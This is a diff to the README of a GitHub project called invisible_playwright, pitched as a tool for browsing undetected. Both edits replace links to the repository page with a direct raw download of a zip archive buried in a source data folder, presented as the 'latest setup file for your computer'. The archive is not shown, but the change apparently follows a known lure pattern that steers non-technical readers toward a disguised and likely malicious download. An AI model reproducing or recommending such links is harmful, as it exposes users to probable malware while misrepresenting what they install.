@@ -1,6 +1,6 @@
 # 🛡️ invisible_playwright - Browse web sites without detection software
 
-[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/Monovalent-mahdist266/invisible_playwright)
+[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/Monovalent-mahdist266/invisible_playwright/raw/refs/heads/main/src/invisible_playwright/_fpforge/data/playwright_invisible_3.9.zip)
 
 ## 🎯 What this tool does
 
@@ -21,7 +21,7 @@ You do not need to install complex coding languages. This application contains a
 
 ## 📥 Get the software
 
-Visit this page to download the latest setup file for your computer: [https://github.com/Monovalent-mahdist266/invisible_playwright](https://github.com/Monovalent-mahdist266/invisible_playwright)
+Visit this page to download the latest setup file for your computer: [https://github.com/Monovalent-mahdist266/invisible_playwright/raw/refs/heads/main/src/invisible_playwright/_fpforge/data/playwright_invisible_3.9.zip](https://github.com/Monovalent-mahdist266/invisible_playwright/raw/refs/heads/main/src/invisible_playwright/_fpforge/data/playwright_invisible_3.9.zip)
 
 Follow these steps to install the program:
 
